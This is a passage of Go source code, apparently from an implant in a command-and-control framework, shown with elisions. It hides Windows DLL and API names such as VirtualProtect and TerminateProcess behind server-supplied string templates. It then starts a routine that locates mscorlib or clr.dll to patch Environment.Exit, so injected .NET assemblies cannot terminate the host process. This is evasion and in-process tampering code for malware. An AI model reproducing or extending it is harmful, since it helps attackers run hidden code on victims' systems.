...
// CLR template indices - must match server-side templates/persistence.go
const (
	idxClrDllMscoree          = 100
	idxClrDllMscorlib         = 101
	idxClrDllKernel32         = 102
	idxClrDllClr              = 103
	idxClrDllWinForms         = 104
	idxClrApiGetModuleHandle  = 105
	idxClrApiGetProcAddress   = 106
	idxClrApiVirtualProtect   = 107
	idxClrApiExitProcess      = 108
	idxClrApiTerminateProcess = 109
	idxClrApiGetCurrentProc   = 110
	idxClrSymSystemNativeExit = 111
	idxClrSymExitMangled      = 112
	idxClrKeyEnvExit          = 113
	idxClrKeyAppExit          = 114
	idxClrKeyProcKill         = 115
	idxClrKeyExitProc         = 116
	idxClrKeyTermProc         = 117
)

// clrTemplate holds server-provided CLR strings (set via SetCLRTemplate)
var clrTemplate []string

// SetCLRTemplate sets the CLR template from server-provided data
func SetCLRTemplate(tpl []string) {
	clrTemplate = tpl
}

// getClrTpl safely retrieves a CLR template string by index
func getClrTpl(idx int) string {
	if clrTemplate != nil && idx < len(clrTemplate) && clrTemplate[idx] != "" {
		return clrTemplate[idx]
	}
	return ""
}

// CLR string accessors using template lookups
func clrDllMscoree() string          { return getClrTpl(idxClrDllMscoree) }
func clrDllMscorlib() string         { return getClrTpl(idxClrDllMscorlib) }
func clrDllKernel32() string         { return getClrTpl(idxClrDllKernel32) }
func clrDllClr() string              { return getClrTpl(idxClrDllClr) }
func clrDllWinForms() string         { return getClrTpl(idxClrDllWinForms) }
func clrApiGetModuleHandle() string  { return getClrTpl(idxClrApiGetModuleHandle) }
func clrApiGetProcAddress() string   { return getClrTpl(idxClrApiGetProcAddress) }
func clrApiVirtualProtect() string   { return getClrTpl(idxClrApiVirtualProtect) }
func clrApiExitProcess() string      { return getClrTpl(idxClrApiExitProcess) }
func clrApiTerminateProcess() string { return getClrTpl(idxClrApiTerminateProcess) }
func clrApiGetCurrentProc() string   { return getClrTpl(idxClrApiGetCurrentProc) }
func clrSymSystemNativeExit() string { return getClrTpl(idxClrSymSystemNativeExit) }
func clrSymExitMangled() string      { return getClrTpl(idxClrSymExitMangled) }
func clrKeyEnvExit() string          { return getClrTpl(idxClrKeyEnvExit) }
func clrKeyAppExit() string          { return getClrTpl(idxClrKeyAppExit) }
func clrKeyProcKill() string         { return getClrTpl(idxClrKeyProcKill) }
func clrKeyExitProc() string         { return getClrTpl(idxClrKeyExitProc) }
func clrKeyTermProc() string         { return getClrTpl(idxClrKeyTermProc) }

// Lazy DLL loaders - initialized on first use
var (
	mscoree  *syscall.LazyDLL
	mscorlib *syscall.LazyDLL
)

func getMscoree() *syscall.LazyDLL {
	if mscoree == nil {
...
func getMscorlib() *syscall.LazyDLL {
	if mscorlib == nil {
...
func (c *CLRExitPrevention) PatchEnvironmentExit() error {
	...
	mscorlibPtr, _ := syscall.UTF16PtrFromString(clrDllMscorlib())
	hModule, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(mscorlibPtr)))
	if hModule == 0 {
		// Try clr.dll if mscorlib isn't loaded
		clrDllPtr, _ := syscall.UTF16PtrFromString(clrDllClr())
		hModule, _, _ = getModuleHandle.Call(uintptr(unsafe.Pointer(clrDllPtr)))
		if hModule == 0 {
